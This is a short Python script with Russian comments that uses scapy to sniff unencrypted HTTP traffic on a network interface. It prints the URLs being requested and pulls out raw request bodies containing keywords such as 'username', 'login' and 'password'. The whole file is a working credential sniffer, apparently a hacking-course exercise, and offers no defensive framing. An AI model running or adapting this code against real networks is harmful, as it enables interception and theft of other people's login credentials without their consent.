import scapy.all as scapy
from scapy.layers import http

# фун для перехвата данных укз сеть инета
def sniff(interface):
    # фун перехвата
    scapy.sniff(iface=interface, store=False, prn=proccess_sniff_pack, filter="tcp port 80")#укз переменную хранение убираем и фун колбака
    
# фун для получения url
def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

# фун для получения логина
def get_login(packet):
    # проверяем строки и отсеиваем не нужную инфу
    if packet.haslayer(scapy.Raw):
        loads = packet[scapy.Raw].load
        # добавим массив для перебора названия в строке
        keys = ["username", "user", "password", "login", "pass"]
        # запускаем цикл для проверки
        for key in keys:
            # делаем проверку строки, чтобы лишенго не получать
            if key in loads.decode():
                return loads
    
#  фун приема пакет
def proccess_sniff_pack(packet):
    # print("hello")
    # проверка есть ли уровень http
    if packet.haslayer(http.HTTPRequest):
        # получаем url 
        url = get_url(packet)
        print("HTTP Request >>>>>> " + url)
        # создаем переменную где будет логин 
        log_info = get_login(packet)
        if log_info:
            print("\n\n New Password !!!!!" + log_info.decode() + "\n\n")
        
        
        
sniff("eth0")